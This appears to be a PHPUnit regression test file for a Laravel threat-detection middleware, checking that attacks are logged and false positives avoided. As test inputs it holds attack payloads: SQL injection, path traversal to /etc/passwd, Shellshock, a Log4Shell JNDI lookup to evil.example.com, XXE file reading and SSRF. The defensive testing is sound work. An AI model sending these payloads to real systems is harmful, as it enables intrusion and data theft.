<?php

namespace JayAnta\ThreatDetection\Tests\Feature;

use JayAnta\ThreatDetection\Tests\TestCase;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Cache;

/**
 * v1.3.1: Full-cycle regression tests for the correctness / false-positive
 * fixes. Each test sends a real HTTP request through the threat-detect
 * middleware (or the dashboard-auth middleware) and asserts on the outcome.
 *
 * These lock in behaviour that previously slipped through:
 *  - JSON request bodies are scanned
 *  - a malformed UTF-8 byte no longer blanks a whole segment
 *  - the Authorization header is not logged as a token threat
 *  - api_route_filtering keys off the route path, not the query string
 *  - remapped NoSQL / web-shell / Shellshock patterns actually fire
 *  - corrected severities
 *  - the dashboard/API guard fails closed on misconfiguration
 */
class Phase9V131FixesTest extends TestCase
{
    protected function setUp(): void
    {
        parent::setUp();

        $this->createThreatLogsTable();
        $this->createExclusionRulesTable();

        config([
            'threat-detection.enabled' => true,
            'threat-detection.detection_mode' => 'strict',
            'threat-detection.min_confidence' => 0,
            'threat-detection.skip_paths' => [],
            'threat-detection.only_paths' => [],
            'threat-detection.whitelisted_ips' => [],
            'threat-detection.api_route_filtering.enabled' => false,
            'threat-detection.content_paths' => [],
            'threat-detection.notifications.enabled' => false,
            'threat-detection.queue.enabled' => false,
            'cache.default' => 'array',
            'app.key' => 'base64:' . base64_encode(str_repeat('a', 32)),
        ]);

        Route::middleware('threat-detect')->group(function () {
            Route::get('/phase9-test', fn() => response('OK', 200));
            Route::post('/phase9-test', fn() => response('OK', 200));
        });

        Route::middleware(['threat-dashboard-auth:dashboard'])
            ->get('/phase9-dashboard', fn() => response('Dashboard OK', 200));
    }

    protected function tearDown(): void
    {
        Cache::flush();
        parent::tearDown();
    }

    // ── #1 JSON request bodies are scanned ───────────────────

    /** @test */
    public function json_request_body_is_scanned(): void
    {
        $this->postJson('/phase9-test', ['q' => 'UNION SELECT password FROM users']);

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[middleware] SQL Injection UNION',
            'threat_level' => 'high',
        ]);
    }

    // ── #2 Malformed UTF-8 no longer disables a segment ──────

    /** @test */
    public function malformed_utf8_byte_does_not_disable_detection(): void
    {
        // A lone 0xFF byte would make json_encode() return false (blanking the
        // segment) without JSON_INVALID_UTF8_SUBSTITUTE.
        $this->call('POST', '/phase9-test', ['q' => "UNION SELECT 1,2,3\xFF"]);

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[middleware] SQL Injection UNION',
        ]);
    }

    // ── #3 Authorization header is not logged as a token threat ─

    /** @test */
    public function authorization_bearer_header_is_not_logged_as_threat(): void
    {
        $jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9'
            . '.eyJzdWIiOiIxMjM0NTY3ODkwIn0'
            . '.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

        $this->get('/phase9-test', [
            'Authorization' => 'Bearer ' . $jwt,
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko',
        ])->assertStatus(200);

        $this->assertDatabaseMissing('threat_logs', ['type' => '[middleware] JWT Token Found']);
        $this->assertDatabaseMissing('threat_logs', ['type' => '[middleware] Bearer Token Detected']);
    }

    // ── #4 api_route_filtering cannot be evaded via the query string ─

    /** @test */
    public function api_suppression_is_not_evadable_via_query_string(): void
    {
        // Non-API route, but the query string contains "/api/". A medium threat
        // must still be logged — suppression keys off the path, not the URL.
        config(['threat-detection.api_route_filtering.enabled' => true]);

        $this->call('GET', '/phase9-test', [
            'path' => '../../../etc/passwd',
            'redir' => '/api/home',
        ]);

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[middleware] Directory Traversal',
        ]);
    }

    // ── #6 Remapped patterns now fire ────────────────────────

    /** @test */
    public function nosql_operator_injection_is_detected(): void
    {
        // Keyword "$ne" lives in the 'injection' category; the label is now
        // mapped there so the pattern actually runs.
        $this->call('POST', '/phase9-test', ['filter' => '[$ne: 1]']);

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[custom] NoSQL $ne Injection',
        ]);
    }

    /** @test */
    public function web_shell_signature_is_detected(): void
    {
        $this->call('POST', '/phase9-test', ['x' => 'c99shell upload']);

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[custom] Web Shell Signature',
            'threat_level' => 'high',
        ]);
    }

    /** @test */
    public function shellshock_without_space_is_detected(): void
    {
        $this->call('POST', '/phase9-test', ['cmd' => '(){ :;};echo vulnerable']);

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[middleware] Shellshock CVE-2014-6271',
            'threat_level' => 'high',
        ]);
    }

    // ── #8 Corrected severities ──────────────────────────────

    /** @test */
    public function log4shell_is_high_severity(): void
    {
        $this->call('POST', '/phase9-test', ['x' => '${jndi:ldap://evil.example.com/a}']);

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[custom] Log4j/Log4Shell Attack',
            'threat_level' => 'high',
        ]);
    }

    /** @test */
    public function xxe_entity_declaration_is_high_severity(): void
    {
        $this->call('POST', '/phase9-test', ['x' => '<!ENTITY xxe SYSTEM "file:///etc/passwd">']);

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[custom] XXE Entity Declaration',
            'threat_level' => 'high',
        ]);
    }

    /** @test */
    public function javascript_uri_is_medium_severity(): void
    {
        $this->call('POST', '/phase9-test', ['x' => 'javascript:void(0)']);

        $this->assertDatabaseHas('threat_logs', [
            'type' => '[middleware] JavaScript URI',
            'threat_level' => 'medium',
        ]);
    }

    /** @test */
    public function real_chrome_user_agent_is_not_flagged_as_localhost_ssrf(): void
    {
        // "Chrome/120.0.0.0" contains "0.0.0.0" — must NOT match Localhost SSRF.
        $this->get('/phase9-test', [
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                . '(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        ])->assertStatus(200);

        $this->assertDatabaseMissing('threat_logs', ['type' => '[middleware] Localhost SSRF']);
    }

    /** @test */
    public function genuine_localhost_ssrf_is_still_detected(): void
    {
        // The boundary fix must not weaken real detection.
        $this->call('POST', '/phase9-test', ['url' => 'http://127.0.0.1:8080/admin']);

        $this->assertDatabaseHas('threat_logs', ['type' => '[middleware] Localhost SSRF']);
    }

    // ── #5 Dashboard/API guard fails closed ──────────────────

    /** @test */
    public function unknown_guard_value_fails_closed(): void
    {
        config(['threat-detection.dashboard.guard' => 'totally-invalid']);

        $this->get('/phase9-dashboard')->assertStatus(403);
    }

    /** @test */
    public function role_guard_without_hasRole_method_fails_closed(): void
    {
        config([
            'threat-detection.dashboard.guard' => 'role',
            'threat-detection.dashboard.role' => 'admin',
        ]);

        // Plain user model with no hasRole() — cannot verify the role.
        $user = new \Illuminate\Foundation\Auth\User();
        $user->id = 1;

        $this->actingAs($user)
            ->get('/phase9-dashboard')
            ->assertStatus(403);
    }
}
